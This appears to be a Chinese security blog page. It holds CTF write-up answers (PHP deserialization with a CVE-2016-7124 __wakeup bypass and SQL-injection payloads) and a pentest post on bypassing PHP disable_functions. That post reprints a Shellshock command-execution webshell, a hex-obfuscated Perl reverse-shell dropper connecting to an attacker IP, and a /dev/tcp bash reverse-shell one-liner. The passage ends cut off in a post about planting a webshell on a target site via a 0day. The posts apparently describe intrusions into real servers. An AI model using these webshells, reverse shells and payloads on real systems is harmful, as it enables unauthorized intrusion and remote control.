<p>访问<strong>flag.php</strong>,显示禁止访问，题目默认显示源码，在下图<strong>代码57行</strong>，数据库查询内容不为空的情况下，定义常量<strong>IN_FLAG</strong>，猜测需要满足该条件才能访问<strong>flag.php</strong>。然后调用<strong>loadData</strong>函数。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/10.png" alt="2"></p>
<p><strong>loadData</strong>函数，对传入参数进行判断，如果验证通过，则作为参数传入到反序列化函数，验证不通过返回为空，该判断绕过可参考Day11,传入内容来源于数据库查询结果，此时可考虑如何构造数据库查询结果。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/11.png" alt="3"></p>
<p>在<strong>index.php</strong>页面显示源码中，我们发现<strong>SoFun</strong>类,如下图，在<strong>__destruct()</strong>函数中，会对类变量<strong>$this-&gt;file</strong>所对应的文件进行包含，类变量反序列化可控，在<strong>loadData</strong>函数调用前，对<strong>IN_FLAG</strong>常量进行了设置，如果<strong>loadData</strong>函数传入参数值为<strong>SoFun</strong>类反序列化字符串，且控制类变量<strong>$this-&gt;file=flag.php</strong>，则可以包含flag.php文件，此时<strong>‘IN_FLAG’</strong>已经设置，可获取到flag，需考虑绕过<strong>__wakeup</strong>函数。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/12.png" alt="4"></p>
<p>考虑如何控制<strong>loadData</strong>函数传入参数的值，从下图可知，<strong>$obj-&gt;role</strong>来源于数据库查询结果，而构建sql语句的username字段来源于<strong>$username</strong>,<strong>$username</strong>变量来源于<strong>func_get_args()函数</strong>,该函数返回包含调用函数参数列表的数组,如果<strong>login()</strong>函数传入参数可控，可通过<strong>union联合查询</strong>，构造查询结果，使构造数据为SoFun类序列化字符串。我们去看一下login函数的调用。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/10.png" alt="2"></p>
<p>在<strong>HINCON</strong>类<strong>__destruct</strong>方法中，通过<strong>call_user_func_array()</strong>函数调用login或source方法，如果<strong>$this-&gt;method=’login’</strong>则可以调用<strong>login()</strong>函数，<strong>$this-&gt;method</strong>为类变量，反序列化可控。<strong>$this-&gt;args</strong>为调用函数传入参数，意味着login函数中$username变量可控，此时可通过SQL注入，构造查询数据。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/13.png" alt="5"></p>
<p>在进行反序列化时，会调用<strong>__wakeup</strong>对类变量args进行处理，此时调用<strong>mysql_escape_string</strong>函数对<strong>$this-&gt;args</strong>进行转义。可通过<strong>CVE-2016-7124</strong>，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过<strong>__wakeup</strong>的执行。绕过检测，进行sql注入。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/14.png" alt="6"></p>
<p>总结一下思路：</p>
<p>1.构造<strong>HITCON</strong>类反序列化字符串，其中<strong>$method=’login’</strong>,<strong>$args</strong>数组’username’部分可用于构造SQL语句，进行SQL注入，’password’部分任意设置。</p>
<p>2.调用<strong>login()</strong>函数后，利用<strong>$username</strong>构造联合查询，使查询结果为<strong>SoFun类</strong>反序列化字符串，设置<strong>$file=’flag.php’</strong>，需绕过<strong>__wakeup()</strong>函数。</p>
<p>3.绕过<strong>LoadData()</strong>函数对反序列化字符串的验证,参考Day11。</p>
<p>4.SoFun类 <strong>__destruct()</strong>函数调用后,包含flag.php文件，获取flag，需绕过<strong>__wakeup()函数</strong>。</p>
<p>第二个答案是另一种思路，大家可研究一下。</p>
<p>注：因为传参方式为GET，注意进行URL编码。</p>
<p>参考答案：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"HITCON"</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">"method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">4</span>:<span class="string">"args"</span>;a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">81</span>:<span class="string">"1' union select 1,2,'a:1:&#123;s:2:"</span>xx<span class="string">";O:%2b5:"</span>SoFun<span class="string">":2:&#123;s:4:"</span>file<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;'%23"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">3</span>:<span class="string">"234"</span>;&#125;&#125;</span><br><span class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">"xx"</span>;O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;s:<span class="number">2</span>:<span class="string">"ff"</span>;O:<span class="number">6</span>:<span class="string">"HITCON"</span>:<span class="number">5</span>:&#123;s:<span class="number">6</span>:<span class="string">"method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">4</span>:<span class="string">"args"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">12</span>:<span class="string">"1' or '1'--+"</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;s:<span class="number">4</span>:<span class="string">"conn"</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/15.png" alt="7"></p>
<h2 id="Day-12题解：-By-l1nk3r"><a href="#Day-12题解：-By-l1nk3r" class="headerlink" title="Day-12题解：(By l1nk3r)"></a>Day-12题解：(By l1nk3r)</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/16.png" alt="16"></p>
<p>从代码 <strong>第27行</strong> 很明显，这道题考查sql注入，但是这里有两个考察点，我们分别来看一下。</p>
<h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p> <strong>第23行</strong> 和 <strong>第24行</strong> 针对 <strong>GET</strong> 方式获取到的 <strong>username</strong> 和 <strong>password</strong> 进行了处理，处理函数为 <strong>clean</strong> 。该函数在 <strong>第16-20行</strong> 处定义，函数的主要功能就是使用 <strong>htmlentities</strong> 函数处理变量中带有的特殊字符，而这里加入了 <strong>htmlentities</strong> 函数的可选参数 <strong>ENT_QUOTES</strong> ，因此这里会对 <strong>单引号</strong> ， <strong>双引号</strong> 等特殊字符进行转义处理。由于这里的注入是字符型的，需要闭合单引号或者逃逸单引号，因此这里需要绕过这个函数。我们可以通过下面这个例子观察 <strong>clean</strong> 函数的处理效果：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/17.png" alt="17"></p>
<p>题目 <strong>第36行</strong> 是进入数据库查询，并且返回 <strong>name</strong> 列字段的值。而这里的sql语句是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' </span></span><br><span class="line"><span class="string">AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br></pre></td></tr></table></figure>
<p>那我们如果输入的 <strong>username</strong> 是 <strong>admin</strong> ， <strong>password</strong> 是 <strong>admin</strong> ，自然就构成了正常要执行的sql语句。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/18.png" alt="18"></p>
<p>这道题的问题就在于可以引入反斜杠，也就是转义符，官方针对 <a href="http://php.net/manual/zh/regexp.reference.escape.php" target="_blank" rel="noopener">转义符</a> 是这么解释的。</p>
<blockquote>
<p>比如，如果你希望匹配一个 “<em>“ 字符，就需要在模式中写为 `\</em>`。 这适用于一个字符在不进行转义会有特殊含义的情况下。</p>
</blockquote>
<p>这里我们看个简单的例子理解一下这个转义符号。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/26.png" alt="26"></p>
<p>转义符号会让当前的特殊符号失去它的作用，这道题由于可以引入反斜杠，也就是转义符号，来让</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query=<span class="string">'SELECT * FROM ctf.users WHERE name=\''</span>.$username.<span class="string">'\' </span></span><br><span class="line"><span class="string">AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br></pre></td></tr></table></figure>
<p><strong>username</strong>后面的 <strong>‘</strong> 失效，只要这个 <strong>‘</strong> 失效，就能闭合<strong>pass=</strong>后面的 <strong>‘</strong>。最后组合的payload就如下图所示</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/19.png" alt="19"></p>
<p>所以实际上目前 <strong>name</strong> 的值是 <strong>admin\‘ AND pass=</strong> ,这时候 <strong>password</strong> 的值是一个可控的输入点，我们可以通过这个值来构造 <strong>sql</strong> 的 <strong>联合查询</strong> ，并且注释掉最后的 <strong>单引号</strong> 。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/20.png" alt="20"></p>
<p>最后我们看看在mysql中执行的结果。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/21.png" alt="21"></p>
<h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>好了第一部分我们其实已经成功构造好了payload，但是回头来看看题目，题目 <strong>第6行</strong> 到 <strong>第16行</strong> 有两个正则表达式，作用就是如果参数中带有 <strong>or、and 、union</strong> 等数据，就退出，并输出 <strong>Attack detected!!!</strong> </p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/22.png" alt="22"></p>
<p>这里当然我们可以正面硬刚这个正则表达式。但是这里我们来聊一个比较有趣的解法。</p>
<p>我们看到是通过 <strong>request</strong> 方式传入数据，而php中 <a href="http://php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="noopener">REQUEST</a> 变量默认情况下包含了 <strong>GET</strong> ，<strong>POST</strong> 和 <strong>COOKIE</strong> 的数组。在 <strong>php.ini</strong> 配置文件中，有一个参数 <strong>variables_order</strong> ，这参数有以下可选项目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; variables_order</span><br><span class="line">;   Default Value: &quot;EGPCS&quot;</span><br><span class="line">;   Development Value: &quot;GPCS&quot;</span><br><span class="line">;   Production Value: &quot;GPCS&quot;</span><br></pre></td></tr></table></figure>
<p>这些字母分别对应的是 <strong>E: Environment</strong> ，<strong>G:Get</strong>，<strong>P:Post</strong>，<strong>C:Cookie</strong>，<strong>S:Server</strong>。这些字母的出现顺序，表明了数据的加载顺序。而 <strong>php.ini</strong> 中这个参数默认的配置是 <strong>GPCS</strong> ，也就是说如果以 <strong>POST</strong> 、 <strong>GET</strong> 方式传入相同的变量，那么用 <strong>REQUEST</strong> 获取该变量的值将为 <strong>POST</strong> 该变量的值。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/23.png" alt="23"></p>
<p>我们举个简单的例子方便大家理解：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/24.png" alt="24"></p>
<p>我们可以看到这里的 <strong>post</strong> 方式传入的数据覆盖了 <strong>get</strong> 方式传入的数据，因此这里最后的payload如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/25.png" alt="25"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们的项目会慢慢完善，如果大家喜欢可以关注 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"> <strong>PHP-Audit-Labs</strong> </a> 。大家若是有什么更好的解法，可以在文章底下留言，祝大家玩的愉快！</p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/27/渗透测试之绕过PHP的disable_functions/">渗透测试之绕过PHP的disable_functions</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-27
        </span>
        
          <div class="post-category">
            
              <a href="/categories/渗透测试/">渗透测试</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <p>继上篇文章之后，这次找了一台linux的机器练习渗透测试。这次的话能写入shell，但是无法执行任何命令，写入一个 <strong>phpinfo</strong> 函数查看详情，发现 <strong>disable_functions</strong> 禁用了很多函数。具体如下：</p>
<p><img src="/img/渗透测试/渗透测试之绕过PHP的disable_functions/1.png" alt="1"></p>
<p>可以看到 <strong>disable_functions </strong> 禁用了一下函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru</span><br></pre></td></tr></table></figure>
<p>于是尝试使用 <a href="https://www.exploit-db.com/exploits/35146/" target="_blank" rel="noopener"><strong>CVE-2014-6271</strong></a> ，但是没有成功。后来发现该利用方法要求 <strong>PHP &lt; 5.6.2</strong> ，而本例中的PHP版本为 <strong>5.6.30</strong> ，关于该CVE利用原理，大家可以参考 <a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a> 这篇文章。这里也顺带贴下脚本，以备不时之需：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>); </span><br><span class="line">   putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>继续通过google搜索解决方法，发现了可以利用如果开启了 <strong>pcntl</strong> 扩展，就可以利用 <strong>pcntl_exec</strong> 函数来执行命令，当然要想利用这种方法的话还是有些限制的（ <strong>PHP 4 &gt;= 4.2.0, PHP 5 on linux</strong> ）。这里直接贴出反弹shell的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*******************************</span></span><br><span class="line"><span class="comment"> *查看phpinfo编译参数--enable-pcntl</span></span><br><span class="line"><span class="comment"> *作者 Spider</span></span><br><span class="line"><span class="comment"> *nc -vvlp 443</span></span><br><span class="line"><span class="comment">********************************/</span></span><br><span class="line"> </span><br><span class="line">$ip = <span class="string">'xxx.xxx.xxx.xxx'</span>;</span><br><span class="line">$port = <span class="string">'443'</span>;</span><br><span class="line">$file = <span class="string">'/tmp/bc.pl'</span>;</span><br><span class="line"> </span><br><span class="line">header(<span class="string">"content-Type: text/html; charset=gb2312"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'pcntl_exec'</span>)) &#123;</span><br><span class="line">        $data = <span class="string">"\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c\x20\x2d\x77\x0d\x0a\x23\x0d\x0a"</span>.</span><br><span class="line">                <span class="string">"\x0d\x0a\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74\x3b\x20\x20\x20\x20\x0d\x0a\x75\x73\x65\x20"</span>.</span><br><span class="line">                <span class="string">"\x53\x6f\x63\x6b\x65\x74\x3b\x0d\x0a\x75\x73\x65\x20\x49\x4f\x3a\x3a\x48\x61\x6e\x64\x6c\x65"</span>.</span><br><span class="line">                <span class="string">"\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x20\x3d\x20\x27"</span>.$ip.</span><br><span class="line">                <span class="string">"\x27\x3b\x0d\x0a\x6d\x79\x20\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x20\x3d\x20\x27"</span>.$port.</span><br><span class="line">                <span class="string">"\x27\x3b\x0d\x0a\x0d\x0a\x6d\x79\x20\x24\x70\x72\x6f\x74\x6f\x20\x3d\x20\x67\x65\x74\x70\x72"</span>.</span><br><span class="line">                <span class="string">"\x6f\x74\x6f\x62\x79\x6e\x61\x6d\x65\x28\x22\x74\x63\x70\x22\x29\x3b\x0d\x0a\x6d\x79\x20\x24"</span>.</span><br><span class="line">                <span class="string">"\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x20\x3d\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e"</span>.</span><br><span class="line">                <span class="string">"\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x70\x6f\x72\x74\x2c\x20\x69\x6e\x65\x74\x5f\x61\x74\x6f"</span>.</span><br><span class="line">                <span class="string">"\x6e\x28\x24\x72\x65\x6d\x6f\x74\x65\x5f\x69\x70\x29\x29\x3b\x0d\x0a\x6d\x79\x20\x24\x73\x68"</span>.</span><br><span class="line">                <span class="string">"\x65\x6c\x6c\x20\x3d\x20\x27\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x27\x3b\x0d\x0a\x73\x6f"</span>.</span><br><span class="line">                <span class="string">"\x63\x6b\x65\x74\x28\x53\x4f\x43\x4b\x2c\x20\x41\x46\x5f\x49\x4e\x45\x54\x2c\x20\x53\x4f\x43"</span>.</span><br><span class="line">                <span class="string">"\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x20\x24\x70\x72\x6f\x74\x6f\x29\x3b\x0d\x0a\x53\x54\x44"</span>.</span><br><span class="line">                <span class="string">"\x4f\x55\x54\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x53\x4f\x43"</span>.</span><br><span class="line">                <span class="string">"\x4b\x2d\x3e\x61\x75\x74\x6f\x66\x6c\x75\x73\x68\x28\x31\x29\x3b\x0d\x0a\x63\x6f\x6e\x6e\x65"</span>.</span><br><span class="line">                <span class="string">"\x63\x74\x28\x53\x4f\x43\x4b\x2c\x24\x70\x61\x63\x6b\x5f\x61\x64\x64\x72\x29\x20\x6f\x72\x20"</span>.</span><br><span class="line">                <span class="string">"\x64\x69\x65\x20\x22\x63\x61\x6e\x20\x6e\x6f\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x3a\x24\x21"</span>.</span><br><span class="line">                <span class="string">"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x49\x4e\x2c\x20\x22\x3c\x26\x53\x4f\x43\x4b"</span>.</span><br><span class="line">                <span class="string">"\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x4f\x55\x54\x2c\x20\x22\x3e\x26\x53\x4f\x43"</span>.</span><br><span class="line">                <span class="string">"\x4b\x22\x3b\x0d\x0a\x6f\x70\x65\x6e\x20\x53\x54\x44\x45\x52\x52\x2c\x20\x22\x3e\x26\x53\x4f"</span>.</span><br><span class="line">                <span class="string">"\x43\x4b\x22\x3b\x0d\x0a\x73\x79\x73\x74\x65\x6d\x28\x24\x73\x68\x65\x6c\x6c\x29\x3b\x0d\x0a"</span>.</span><br><span class="line">                <span class="string">"\x63\x6c\x6f\x73\x65\x20\x53\x4f\x43\x4b\x3b\x0d\x0a\x65\x78\x69\x74\x20\x30\x3b\x0a"</span>;</span><br><span class="line">        $fp = fopen($file,<span class="string">'w'</span>);</span><br><span class="line">        $key = fputs($fp,$data);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">if</span>(!$key) <span class="keyword">exit</span>(<span class="string">'写入'</span>.$file.<span class="string">'失败'</span>);</span><br><span class="line">        chmod($file,<span class="number">0777</span>);</span><br><span class="line">        pcntl_exec($file);</span><br><span class="line">        unlink($file);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'不支持pcntl扩展'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>只要在本机上开启 <strong>nc</strong> 侦听端口，即可收到反弹回来的shell。</p>
<p><img src="/img/渗透测试/渗透测试之绕过PHP的disable_functions/2.png" alt="2"></p>
<p>接下来就是提权了。先来看一下目标的内核版本，然后通过 <strong>searchsploit</strong> 来查找可用的提权exp：</p>
<p><img src="/img/渗透测试/渗透测试之绕过PHP的disable_functions/3.png" alt="3"></p>
<p>后来在目标机器上编译失败，报错如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn.c -o pwn</span><br><span class="line">gcc: error trying to <span class="built_in">exec</span> <span class="string">'cc1'</span>: execvp: No such file or directory</span><br></pre></td></tr></table></figure>
<p>还没来的及解决，管理员就将主机关闭了，测试也就到此结束。</p>
<p>后来又找了一台类似的机器，内核版本一样，但是这次没有设置 <strong>disable_functions </strong> 仍是反弹不会来，猜测目标服务器配置了流量出站规则，不允许内网机器向外连奇怪的端口。如果是这样的话，我们连常用的端口即可。于是我在机器上用 <strong>nc</strong> 侦听了80端口，用命令： <strong>/bin/bash -i &gt; /dev/tcp/IP/80 0&lt;&amp;1 2&gt;&amp;1</strong> ，随机收到了反弹回来的shell。</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="http://reverse-tcp.xyz/php/pentest/2016/12/22/php-disabled_functions-bypass.html" target="_blank" rel="noopener">PHP Disabled_functions Bypass</a> </p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">PHP disable_functions Bypass的方法探究</a> </p>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a> </p>
<p><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshell下命令执行限制及绕过方法</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/26/渗透测试之MSF窃取Windows用户令牌/">渗透测试之MSF窃取Windows用户令牌</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-26
        </span>
        
          <div class="post-category">
            
              <a href="/categories/渗透测试/">渗透测试</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先利用自己审计的0day将一句话木马写入目标网站，使用菜刀连接上目标，打开虚拟终端查看当前拥有的用户及系统信息。可以发现，网站系统为2008 R2版本的，且打了比较多的补丁。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">D:\www\&gt; net users</span><br><span class="line"></span><br><span class="line">\\WIN-********* 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    mysql                    </span><br><span class="line">MySQL                    www</span><br><span class="line">D:\www\&gt; systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           WIN-*********</span><br><span class="line">OS 名称:          Microsoft Windows Server 2008 R2 Enterprise </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00486-OEM-8400691-20006</span><br><span class="line">初始安装日期:     2018/8/29, 14:37:18</span><br><span class="line">系统启动时间:     2018/9/13, 3:20:51</span><br><span class="line">系统制造商:       Gooxi</span><br><span class="line">系统型号:         SY312-S24R/SY206-S12R/SY103-S06R</span><br><span class="line">系统类型:         x64-based PC</span><br><span 